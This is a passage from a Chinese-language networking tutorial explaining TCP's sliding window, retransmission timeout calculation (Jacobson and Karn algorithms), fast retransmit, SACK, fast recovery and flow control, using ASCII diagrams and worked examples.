减少数据段数量<br></code></pre></td></tr></table></figure><hr><h2 id="3-滑动窗口机制"><a href="#3-滑动窗口机制" class="headerlink" title="3. 滑动窗口机制"></a>3. 滑动窗口机制</h2><h3 id="3-1-为什么需要滑动窗口？"><a href="#3-1-为什么需要滑动窗口？" class="headerlink" title="3.1 为什么需要滑动窗口？"></a>3.1 为什么需要滑动窗口？</h3><p><strong>停止等待协议的问题</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">停止等待 (Stop-and-Wait)：<br>1. 发送一个段<br>2. 等待ACK<br>3. 收到ACK后发送下一个段<br><br>效率：非常低<br><br>示例：<br>RTT = 100ms<br>数据段大小 = 1KB<br><br>时间线：<br><span class="hljs-attribute">t</span>=0ms:    发送段1<br><span class="hljs-attribute">t</span>=100ms:  收到ACK1<br><span class="hljs-attribute">t</span>=100ms:  发送段2<br><span class="hljs-attribute">t</span>=200ms:  收到ACK2<br><span class="hljs-built_in">..</span>.<br><br>吞吐量 = 1KB / 100ms = 10KB/s = 80Kbps<br><br>即使带宽是1Gbps，也只能用到80Kbps！❌<br></code></pre></td></tr></table></figure><p><strong>滑动窗口解决方案</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">连续发送多个段，不用等待ACK<br><br>示例（窗口大小=4）：<br><span class="hljs-attribute">t</span>=0ms:    发送段1、段2、段3、段4<br><span class="hljs-attribute">t</span>=100ms:  收到ACK1，窗口滑动，发送段5<br><span class="hljs-attribute">t</span>=105ms:  收到ACK2，窗口滑动，发送段6<br><span class="hljs-built_in">..</span>.<br><br>吞吐量大幅提升！✅<br></code></pre></td></tr></table></figure><h3 id="3-2-发送窗口"><a href="#3-2-发送窗口" class="headerlink" title="3.2 发送窗口"></a>3.2 发送窗口</h3><p><strong>发送窗口结构</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs armasm">字节流：<br>┌────────────────────────────────────────────────────┐<br>│ 已发送  │  已发送   │   可以发送    │    不能发送   │<br>│ 已确认  │  未确认   │   (窗口内)    │   (窗口外)    │<br>└────────────────────────────────────────────────────┘<br>    ↑          ↑             ↑              ↑<br>   <span class="hljs-built_in">P1</span>         <span class="hljs-built_in">P2</span>            <span class="hljs-built_in">P3</span>             <span class="hljs-built_in">P4</span><br><br><span class="hljs-symbol">P1:</span> 已发送并已确认的最后一个字节<br><span class="hljs-symbol">P2:</span> 已发送但未确认的最后一个字节<br><span class="hljs-symbol">P3:</span> 允许发送的最后一个字节<br><span class="hljs-symbol">P4:</span> 未来的数据<br><br>发送窗口 = <span class="hljs-built_in">P3</span> - <span class="hljs-built_in">P1</span><br>可用窗口 = <span class="hljs-built_in">P3</span> - <span class="hljs-built_in">P2</span><br>已发送未确认 = <span class="hljs-built_in">P2</span> - <span class="hljs-built_in">P1</span><br></code></pre></td></tr></table></figure><p><strong>窗口滑动过程</strong>：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs tap">初始状态（窗口大小=6）：<br>┌────┬────┬────┬────┬────┬────┬────┬────┬────┐<br>│<span class="hljs-number"> 1 </span> │<span class="hljs-number"> 2 </span> │<span class="hljs-number"> 3 </span> │<span class="hljs-number"> 4 </span> │<span class="hljs-number"> 5 </span> │<span class="hljs-number"> 6 </span> │<span class="hljs-number"> 7 </span> │<span class="hljs-number"> 8 </span> │<span class="hljs-number"> 9 </span> │<br>└────┴────┴────┴────┴────┴────┴────┴────┴────┘<br>       └────────窗口────────┘<br>       可发送：1,2,3,4,5,6<br><br>步骤1：发送1,2,3<br>┌────┬────┬────┬────┬────┬────┬────┬────┬────┐<br>│ 1* │ 2* │ 3* │<span class="hljs-number"> 4 </span> │<span class="hljs-number"> 5 </span> │<span class="hljs-number"> 6 </span> │<span class="hljs-number"> 7 </span> │<span class="hljs-number"> 8 </span> │<span class="hljs-number"> 9 </span> │<br>└────┴────┴────┴────┴────┴────┴────┴────┴────┘<br>       └────────窗口────────┘<br>       *=已发送<br><br>步骤2：收到ACK for 1,2<br>┌────┬────┬────┬────┬────┬────┬────┬────┬────┐<br>│ 1✓ │ 2✓ │ 3* │<span class="hljs-number"> 4 </span> │<span class="hljs-number"> 5 </span> │<span class="hljs-number"> 6 </span> │<span class="hljs-number"> 7 </span> │<span class="hljs-number"> 8 </span> │<span class="hljs-number"> 9 </span> │<br>└────┴────┴────┴────┴────┴────┴────┴────┴────┘<br>             └────────窗口────────┘<br>             窗口向右滑动2格<br><br>步骤3：可以发送7,8<br>┌────┬────┬────┬────┬────┬────┬────┬────┬────┐<br>│ 1✓ │ 2✓ │ 3* │<span class="hljs-number"> 4 </span> │<span class="hljs-number"> 5 </span> │<span class="hljs-number"> 6 </span> │<span class="hljs-number"> 7 </span> │<span class="hljs-number"> 8 </span> │<span class="hljs-number"> 9 </span> │<br>└────┴────┴────┴────┴────┴────┴────┴────┴────┘<br>             └────────窗口────────┘<br>             发送7,8<br></code></pre></td></tr></table></figure><h3 id="3-3-接收窗口"><a href="#3-3-接收窗口" class="headerlink" title="3.3 接收窗口"></a>3.3 接收窗口</h3><p><strong>接收窗口结构</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs armasm">字节流：<br>┌────────────────────────────────────────────────────┐<br>│   已接收    │    可以接收      │      不能接收      │<br>│   已确认    │   (窗口内)       │     (窗口外)       │<br>└────────────────────────────────────────────────────┘<br>       ↑             ↑                  ↑<br>      <span class="hljs-built_in">Q1</span>            <span class="hljs-built_in">Q2</span>                 <span class="hljs-built_in">Q3</span><br><br><span class="hljs-symbol">Q1:</span> 已接收并已确认的最后一个字节<br><span class="hljs-symbol">Q2:</span> 期望接收的最后一个字节<br><span class="hljs-symbol">Q3:</span> 不能接收的第一个字节<br><br>接收窗口 = <span class="hljs-built_in">Q3</span> - <span class="hljs-built_in">Q1</span><br></code></pre></td></tr></table></figure><p><strong>乱序到达的处理</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">期望接收顺序：1, 2, 3, 4, 5<br><br>实际到达顺序：1, 3, 2, 5, 4<br><br>处理：<br>1. 收到1 → 交付应用层，<span class="hljs-attribute">ACK</span>=2<br>2. 收到3 → 缓存（等待2），<span class="hljs-attribute">ACK</span>=2<br>3. 收到2 → 交付1,2,3，<span class="hljs-attribute">ACK</span>=4<br>4. 收到5 → 缓存（等待4），<span class="hljs-attribute">ACK</span>=4<br>5. 收到4 → 交付4,5，<span class="hljs-attribute">ACK</span>=6<br><br>策略：<br>- 按序交付给应用层<br>- 乱序数据暂存在缓冲区<br>- 累积确认<br></code></pre></td></tr></table></figure><h3 id="3-4-窗口大小的影响"><a href="#3-4-窗口大小的影响" class="headerlink" title="3.4 窗口大小的影响"></a>3.4 窗口大小的影响</h3><p><strong>带宽延迟积（BDP）</strong>：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">BDP</span> <span class="hljs-operator">=</span> 带宽 × RTT<br><br>示例：<br>带宽 <span class="hljs-operator">=</span> <span class="hljs-number">100</span> Mbps <span class="hljs-operator">=</span> <span class="hljs-number">12.5</span> MB/s<br><span class="hljs-attribute">RTT</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span> ms <span class="hljs-operator">=</span> <span class="hljs-number">0.1</span> s<br><br><span class="hljs-attribute">BDP</span> <span class="hljs-operator">=</span> <span class="hljs-number">12.5</span> MB/s × <span class="hljs-number">0.1</span>s <span class="hljs-operator">=</span> <span class="hljs-number">1.25</span> MB<br><br>含义：<br>- 在收到ACK前，可以发送<span class="hljs-number">1.25</span>MB数据<br>- 窗口大小应该 ≥ BDP<br>- 否则无法充分利用带宽<br></code></pre></td></tr></table></figure><p><strong>窗口大小限制</strong>：</p><figure class="highlight rib"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs rib">TCP头部窗口字段：<span class="hljs-number">16</span>位<br>最大窗口大小：<span class="hljs-number">2</span>^<span class="hljs-number">16</span> = <span class="hljs-number">65536</span> 字节 = <span class="hljs-number">64</span> KB<br><br>问题：<br>高速长延迟网络（如卫星链路）需要更大窗口<br><br>解决：<br>窗口扩大选项 (Window <span class="hljs-keyword">Scale</span> <span class="hljs-keyword">Option</span>)<br>实际窗口 = 窗口字段值 × <span class="hljs-number">2</span>^<span class="hljs-keyword">Scale</span><br>最大<span class="hljs-keyword">Scale</span> = <span class="hljs-number">14</span><br>最大窗口 = <span class="hljs-number">65536</span> × <span class="hljs-number">2</span>^<span class="hljs-number">14</span> = <span class="hljs-number">1</span> GB<br></code></pre></td></tr></table></figure><hr><h2 id="4-超时重传机制"><a href="#4-超时重传机制" class="headerlink" title="4. 超时重传机制"></a>4. 超时重传机制</h2><h3 id="4-1-超时重传原理"><a href="#4-1-超时重传原理" class="headerlink" title="4.1 超时重传原理"></a>4.1 超时重传原理</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">发送方行为：<br><span class="hljs-bullet">1.</span> 发送数据段<br><span class="hljs-bullet">2.</span> 启动重传计时器<br><span class="hljs-bullet">3.</span> 如果超时仍未收到ACK<br>   └─ 重传该数据段<br><span class="hljs-bullet">4.</span> 收到ACK<br>   └─ 取消计时器<br></code></pre></td></tr></table></figure><p><strong>超时重传示例</strong>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">发送方                                     接收方<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1000, Len=100                       </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string"> [启动计时器]                              </span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                                       ❌ 数据丢失</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> [超时！]                                 </span>|<br>  |<span class="hljs-string"> SEQ=1000, Len=100 (重传)                </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                  ACK=1100                </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br>  |<span class="hljs-string"> ✅ 收到ACK，取消计时器                    </span>|<br></code></pre></td></tr></table></figure><h3 id="4-2-重传超时时间（RTO）的计算"><a href="#4-2-重传超时时间（RTO）的计算" class="headerlink" title="4.2 重传超时时间（RTO）的计算"></a>4.2 重传超时时间（RTO）的计算</h3><p><strong>问题：RTO设置多少合适？</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RTO太小：<br><span class="hljs-bullet">- </span>不必要的重传<br><span class="hljs-bullet">- </span>浪费带宽<br><span class="hljs-bullet">- </span>加重网络负担<br><br>RTO太大：<br><span class="hljs-bullet">- </span>重传延迟大<br><span class="hljs-bullet">- </span>影响性能<br><span class="hljs-bullet">- </span>用户体验差<br><br>理想：RTO 略大于 RTT<br></code></pre></td></tr></table></figure><p><strong>RTO计算算法（Jacobson算法）</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1. 测量RTT样本（每次收到ACK时）<br>   RTT_sample = ACK到达时间 - 发送时间<br><br>2. 计算平滑RTT（SRTT）<br>   SRTT = (1 - α) × SRTT + α × RTT_sample<br>   α = 0.125 (1/8)<br><br>3. 计算RTT变化（RTTVAR）<br>   RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|<br>   β = 0.25 (1/4)<br><br>4. 计算RTO<br>   RTO = SRTT + 4 × RTTVAR<br>   最小值：200ms（Linux默认）<br>   最大值：120秒<br><br>示例：<br>假设：<br>RTT样本序列：100ms, 110ms, 90ms, 105ms<br><br>初始：<span class="hljs-attribute">SRTT</span>=100ms, <span class="hljs-attribute">RTTVAR</span>=0<br><br>第1次：<span class="hljs-attribute">RTT</span>=110ms<br>SRTT = 0.875×100 + 0.125×110 = 101.25ms<br>RTTVAR = 0.75×0 + 0.25×|100-110| = 2.5ms<br>RTO = 101.25 + 4×2.5 = 111.25ms<br><br>第2次：<span class="hljs-attribute">RTT</span>=90ms<br>SRTT = 0.875×101.25 + 0.125×90 = 99.84ms<br>RTTVAR = 0.75×2.5 + 0.25×|101.25-90| = 4.69ms<br>RTO = 99.84 + 4×4.69 = 118.6ms<br></code></pre></td></tr></table></figure><h3 id="4-3-重传歧义问题"><a href="#4-3-重传歧义问题" class="headerlink" title="4.3 重传歧义问题"></a>4.3 重传歧义问题</h3><p><strong>问题：重传后收到ACK，这个ACK是对原始段还是重传段的确认？</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">场景1：ACK是对原始段的确认<br>发送方                                     接收方<br>  |<span class="hljs-string"> SEQ=1000                                </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string"> [启动计时器]                              </span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                         ACK=1100 (延迟)  </span>|<br>  |<span class="hljs-string"> [超时！重传]                 ↓            </span>|<br>  |<span class="hljs-string"> SEQ=1000 (重传)           ↓              </span>|<br>  |<span class="hljs-string">──────────────&gt;            ↓              </span>|<br>  |<span class="hljs-string">                           ↓              </span>|<br>  |<span class="hljs-string">&lt;──────────────────────────┘              </span>|<br>  |<span class="hljs-string"> 收到ACK                                  </span>|<br><br>  RTT计算：如果用重传时间，会高估RTT ❌<br><br>场景2：ACK是对重传段的确认<br>发送方                                     接收方<br>  |<span class="hljs-string"> SEQ=1000                                </span>|<br>  |<span class="hljs-string">─────────────&gt; ❌ 丢失                    </span>|<br>  |<span class="hljs-string"> [启动计时器]                              </span>|<br>  |<span class="hljs-string"> [超时！重传]                              </span>|<br>  |<span class="hljs-string"> SEQ=1000 (重传)                         </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                  ACK=1100                </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br><br>  RTT计算：如果用原始发送时间，会高估RTT ❌<br></code></pre></td></tr></table></figure><p><strong>Karn算法解决方案</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">规则：<br><span class="hljs-bullet">1.</span> 重传的段不用于RTT计算<br><span class="hljs-bullet">2.</span> 只用成功传输（未重传）的段计算RTT<br><br>缺点：<br>如果连续丢包，无法更新RTO<br><br>解决：<br>结合指数退避（Exponential Backoff）<br>每次重传，RTO翻倍<br>RTO<span class="hljs-emphasis">_new = RTO_</span>old × 2<br></code></pre></td></tr></table></figure><hr><h2 id="5-快速重传与快速恢复"><a href="#5-快速重传与快速恢复" class="headerlink" title="5. 快速重传与快速恢复"></a>5. 快速重传与快速恢复</h2><h3 id="5-1-快速重传（Fast-Retransmit）"><a href="#5-1-快速重传（Fast-Retransmit）" class="headerlink" title="5.1 快速重传（Fast Retransmit）"></a>5.1 快速重传（Fast Retransmit）</h3><p><strong>问题：超时重传太慢</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">传统超时重传：<br><span class="hljs-bullet">- </span>等待RTO超时（可能几百毫秒）<br><span class="hljs-bullet">- </span>影响传输效率<br></code></pre></td></tr></table></figure><p><strong>快速重传原理</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">规则：<br>收到3个重复ACK，立即重传，不等超时<br><br>为什么是3个？<br><span class="hljs-bullet">- </span>1个重复ACK：可能是乱序到达<br><span class="hljs-bullet">- </span>2个重复ACK：可能还是乱序<br><span class="hljs-bullet">- </span>3个重复ACK：很可能是丢包<br></code></pre></td></tr></table></figure><p><strong>快速重传示例</strong>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">发送方                                     接收方<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1000, Len=100                       </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1100                </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1100, Len=100                       </span>|<br>  |<span class="hljs-string">─────────&gt;  ❌ 丢失                       </span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1200, Len=100                       </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1100 (重复1)        </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1300, Len=100                       </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1100 (重复2)        </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1400, Len=100                       </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1100 (重复3)        </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> 🚀 收到3个重复ACK，立即重传！             </span>|<br>  |<span class="hljs-string"> SEQ=1100, Len=100 (快速重传)            </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1500                </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br>  |<span class="hljs-string"> ✅ 成功恢复                               </span>|<br></code></pre></td></tr></table></figure><h3 id="5-2-SACK（选择性确认）"><a href="#5-2-SACK（选择性确认）" class="headerlink" title="5.2 SACK（选择性确认）"></a>5.2 SACK（选择性确认）</h3><p><strong>累积ACK的局限</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">发送：段1(1000), 段2(1100), 段3(1200), 段4(1300)<br>接收：段1✓, 段2✗, 段3✓, 段4✓<br><br>累积ACK只能发送：ACK=1100<br>发送方不知道段3和段4是否收到<br><br>问题：<br><span class="hljs-bullet">- </span>发送方可能重传段2、3、4（浪费）<br><span class="hljs-bullet">- </span>只需要重传段2即可<br></code></pre></td></tr></table></figure><p><strong>SACK解决方案</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dns">SACK选项格式：<br>┌─────────────────────────────────────────┐<br>│ Kind=<span class="hljs-number">5</span> │ Length │ Left Edge │Right Edge │<br>└─────────────────────────────────────────┘<br><br>示例：<br>接收到：<span class="hljs-number">1000-1099</span>, <span class="hljs-number">1200-1299</span>, <span class="hljs-number">1300-1399</span><br><br>SACK选项：<br>ACK=<span class="hljs-number">1100</span><br>SACK: <span class="hljs-number">1200-1300</span>, <span class="hljs-number">1300-1400</span><br><br>含义：<br>- 期望收到<span class="hljs-number">1100</span><br>- 但已经收到<span class="hljs-number">1200-1399</span>的数据<br><br>发送方行为：<br>- 只重传<span class="hljs-number">1100-1199</span><br>- 不重传<span class="hljs-number">1200-1399</span> ✅<br></code></pre></td></tr></table></figure><h3 id="5-3-快速恢复（Fast-Recovery）"><a href="#5-3-快速恢复（Fast-Recovery）" class="headerlink" title="5.3 快速恢复（Fast Recovery）"></a>5.3 快速恢复（Fast Recovery）</h3><p><strong>快速恢复算法</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">触发：收到3个重复ACK时<br><br>步骤：<br><span class="hljs-bullet">1.</span> 拥塞窗口减半<br>   cwnd = cwnd / 2<br>   ssthresh = cwnd<br><br><span class="hljs-bullet">2.</span> 快速重传丢失的段<br><br><span class="hljs-bullet">3.</span> 每收到一个重复ACK<br>   cwnd = cwnd + 1 (临时膨胀)<br><br><span class="hljs-bullet">4.</span> 收到新的ACK<br>   cwnd = ssthresh (恢复正常)<br>   进入拥塞避免阶段<br><br>目的：<br><span class="hljs-bullet">-</span> 快速恢复，不回到慢启动<br><span class="hljs-bullet">-</span> 保持较高的发送速率<br></code></pre></td></tr></table></figure><hr><h2 id="6-流量控制"><a href="#6-流量控制" class="headerlink" title="6. 流量控制"></a>6. 流量控制</h2><h3 id="6-1-流量控制的目的"><a href="#6-1-流量控制的目的" class="headerlink" title="6.1 流量控制的目的"></a>6.1 流量控制的目的</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">问题：<br>发送方发送速度 &gt; 接收方处理速度<br>接收方缓冲区溢出，数据丢失<br><br>解决：<br>接收方通过窗口大小告诉发送方还能接收多少数据<br></code></pre></td></tr></table></figure><h3 id="6-2-流量控制机制"><a href="#6-2-流量控制机制" class="headerlink" title="6.2 流量控制机制"></a>6.2 流量控制机制</h3><p><strong>接收窗口通告</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">接收方在每个ACK中通告窗口大小<br><br>示例：<br>接收缓冲区大小：8KB<br>已接收未读：2KB<br>可用空间：6KB<br><br>发送ACK：<br><span class="hljs-attribute">ACK</span>=1000, <span class="hljs-attribute">Window</span>=6144 (6KB)<br><br>发送方：<br>- 最多再发送6KB数据<br>- 发送后等待ACK和新的窗口通告<br></code></pre></td></tr></table></figure><p><strong>零窗口问题</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">场景：<br><span class="hljs-bullet">1.</span> 